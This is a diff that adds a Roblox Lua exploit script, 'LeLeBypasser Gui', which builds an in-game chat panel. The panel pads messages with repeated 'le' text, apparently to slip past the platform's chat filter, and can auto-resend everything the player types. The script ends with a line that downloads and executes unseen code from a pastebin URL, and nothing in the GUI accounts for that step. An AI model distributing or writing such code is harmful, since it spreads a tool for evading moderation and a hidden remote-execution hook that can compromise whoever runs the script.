@@ -1,0 +1,141 @@
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.Name = "ScreenGuiLol"
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 180) -- Укороченный размер фрейма
+Frame.Position = UDim2.new(0.5, -150, 0.5, -90)
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 2
+Frame.Parent = ScreenGui
+Frame.Active = true
+Frame.Draggable = true
+
+local Gradient = Instance.new("UIGradient")
+Gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), -- Белый
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 255)), -- Синий
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)) -- Красный
+})
+Gradient.Rotation = 90
+Gradient.Parent = Frame
+
+local CreditTitle = Instance.new("TextLabel")
+CreditTitle.Size = UDim2.new(0, 300, 0, 20)
+CreditTitle.Position = UDim2.new(0, 0, 0, 25) -- Выше Title
+CreditTitle.Text = "t.me/ChomikDev"
+CreditTitle.Font = Enum.Font.SourceSans
+CreditTitle.TextColor3 = Color3.fromRGB(0, 0, 0) -- Чёрный цвет
+CreditTitle.TextSize = 14
+CreditTitle.BackgroundTransparency = 1
+CreditTitle.Parent = Frame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0, 300, 0, 30)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "LeLeBypasser Gui (v1.3)"
+Title.Font = Enum.Font.SourceSansBold
+Title.TextColor3 = Color3.fromRGB(0, 0, 0)
+Title.TextSize = 20
+Title.BackgroundTransparency = 1
+Title.Parent = Frame
+
+local CloseButton = Instance.new("TextButton")
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+CloseButton.Position = UDim2.new(1, -40, 0, 5)
+CloseButton.Text = "X"
+CloseButton.Font = Enum.Font.SourceSansBold
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+CloseButton.TextSize = 18
+CloseButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CloseButton.BorderSizePixel = 2
+CloseButton.Parent = Frame
+
+local TextBox = Instance.new("TextBox")
+TextBox.Size = UDim2.new(0, 260, 0, 50)
+TextBox.Position = UDim2.new(0, 20, 0, 50)
+TextBox.PlaceholderText = "Message"
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+TextBox.TextSize = 16
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 2
+TextBox.ClearTextOnFocus = false
+TextBox.Parent = Frame
+TextBox.Text = ""
+
+local ChatButton = Instance.new("TextButton")
+ChatButton.Size = UDim2.new(0, 80, 0, 40)
+ChatButton.Position = UDim2.new(0, 20, 0, 120)
+ChatButton.Text = "Chat"
+ChatButton.Font = Enum.Font.SourceSansBold
+ChatButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ChatButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+ChatButton.TextSize = 16
+ChatButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ChatButton.BorderSizePixel = 2
+ChatButton.Parent = Frame
+
+local ClearButton = Instance.new("TextButton")
+ClearButton.Size = UDim2.new(0, 80, 0, 40)
+ClearButton.Position = UDim2.new(0.5, -40, 0, 120) -- Центр
+ClearButton.Text = "Clear"
+ClearButton.Font = Enum.Font.SourceSansBold
+ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ClearButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+ClearButton.TextSize = 16
+ClearButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ClearButton.BorderSizePixel = 2
+ClearButton.Parent = Frame
+
+local AutoButton = Instance.new("TextButton")
+AutoButton.Size = UDim2.new(0, 80, 0, 40)
+AutoButton.Position = UDim2.new(1, -100, 0, 120) -- Справа
+AutoButton.Text = "Auto"
+AutoButton.Font = Enum.Font.SourceSansBold
+AutoButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+AutoButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+AutoButton.TextSize = 16
+AutoButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AutoButton.BorderSizePixel = 2
+AutoButton.Parent = Frame
+
+local autoEnabled = false
+local lastMessage = ""
+
+AutoButton.MouseButton1Click:Connect(function()
+    autoEnabled = not autoEnabled
+    if autoEnabled then
+        AutoButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Зеленый
+    else
+        AutoButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70) -- Обычный
+    end
+end)
+
+ChatButton.MouseButton1Click:Connect(function()
+    local message = TextBox.Text
+    if message ~= "" then
+        local formattedMessage = message .. " le le le le le le"
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(formattedMessage, "All")
+    end
+end)
+
+ClearButton.MouseButton1Click:Connect(function()
+    TextBox.Text = ""
+end)
+
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
+    if autoEnabled and msg ~= lastMessage then
+        local autoMessage = msg .. " le le le le le le"
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(autoMessage, "All")
+        lastMessage = msg
+    end
+end)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/7LDwRkKW"))()
